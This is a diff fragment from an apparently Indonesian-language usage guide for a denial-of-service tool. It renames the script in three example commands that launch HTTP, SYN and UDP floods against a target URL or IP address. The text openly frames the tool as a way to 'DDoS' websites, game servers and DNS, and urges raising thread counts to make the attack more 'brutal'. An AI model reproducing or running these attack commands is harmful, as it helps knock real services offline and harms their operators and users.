@@ -8,17 +8,17 @@ Jalankan:
 HTTP Flood (untuk nge-DDoS situs web):
 
 *bash*
-python zindoos.py -t https://target.com -d 120 --mode http
+python ddosser.py -t https://target.com -d 120 --mode http
 (Ganti target.com sama URL yang mau diserang, 120 detik)
 
 SYN Flood (butuh admin/root di Linux, tapi fallback TCP Connect jalan tanpa root):
 
 *bash*
-sudo python zindoos.py -t 192.168.1.100 -p 80 -d 60 --mode syn
+sudo python ddosser.py -t 192.168.1.100 -p 80 -d 60 --mode syn
 UDP Flood (ampuh buat game server atau DNS):
 
 *bash*
-python zindoos.py -t 192.168.1.100 -p 53 -d 60 --mode udp
+python ddosser.py -t 192.168.1.100 -p 53 -d 60 --mode udp
 Setting THREADS di awal kode – makin tinggi, makin brutal. Tapi hati-hati, komputer lu juga bisa lag.
 
 🔥 FITUR KEJAM
